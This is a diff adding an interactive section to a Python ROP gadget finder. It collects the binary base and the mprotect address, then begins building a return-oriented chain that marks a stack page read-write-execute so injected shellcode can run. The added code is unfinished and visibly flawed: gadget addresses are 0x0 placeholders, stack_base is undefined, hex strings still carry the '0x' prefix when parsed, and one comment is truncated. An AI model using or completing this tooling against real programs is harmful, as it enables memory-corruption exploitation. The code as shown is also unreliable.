@@ -51,5 +51,31 @@ while gadgetIndex < len(gadgets):
         if(not broke):
                 del gadgets[gadgetIndex]
 
+print("Available Gadgets: ")
 for i in gadgets:
         print(i)
+heapOrStack = input("Heap or stack  injection? Write \"H\" for Heap or \"S\" for stack: ")
+if heapOrStack == "S":
+        baseOfBinary = input("Input base of the binary in hex, including the leading \"0x\":  ")
+        addressOfMprotect = input("Input address of mprotect (PLT or libc is fine): ")
+        gadget1addr = "0x0"
+        gadget2addr = "0x0"
+        gadget3addr = "0x0"
+
+        gadget1 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget1addr, 16)))
+        gadget1.reverse()
+        gadget2 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget2addr, 16)))
+        gadget2.reverse()
+        gadget3 = bytearray.fromhex(hex(int(baseOfBinary, 16) + int(gadget3addr, 16)))
+        gadget3.reverse()
+
+        arg_addr = bytearray.fromhex(hex(int(stack_base, 16) - (int(stack_base, 16)%4096))[2:]) # change bc st$
+        arg_addr.reverse()
+
+        arg_len = b"\x00\x10\x00"  # len of the shellcode as size_t
+
+        arg_prot = b"\x07"  # int, look at man pages (c-level flags)
+
+        faddr_byte_array = bytearray.fromhex(addressOfMprotect[2:])
+        faddr_byte_array.reverse()
+
